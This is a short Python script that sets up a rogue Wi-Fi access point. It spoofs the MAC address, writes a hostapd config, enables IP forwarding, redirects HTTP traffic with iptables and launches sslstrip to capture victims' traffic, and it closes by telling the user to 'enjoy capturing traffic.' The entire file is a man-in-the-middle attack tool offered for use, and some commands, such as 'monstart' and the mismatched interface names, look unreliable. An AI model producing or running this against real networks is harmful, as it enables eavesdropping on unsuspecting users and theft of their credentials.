import os

# Start monitor mode
os.system("monstart wlan0")

# Change MAC address
os.system("ifconfig wlan0 down")
os.system("macchanger -r wlan0")
os.system("ifconfig wlan0 up")

# Configure hostapd for creating the rogue AP
hostapd_conf = '''
interface=wlan0mon
driver=nl80211
ssid=RogueAP
channel=6
'''
with open("/etc/hostapd/hostapd.conf", "w") as f:
    f.write(hostapd_conf)

# Start the rogue AP
os.system("hostapd /etc/hostapd/hostapd.conf &")

# Enable IP forwarding
os.system("sysctl -w net.ipv4.ip_forward=1")

# Set up iptables for traffic redirection
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

# Start sslstrip to capture HTTP traffic
os.system("sslstrip -l 8080 &")

print("Rogue AP created successfully! Enjoy capturing traffic.")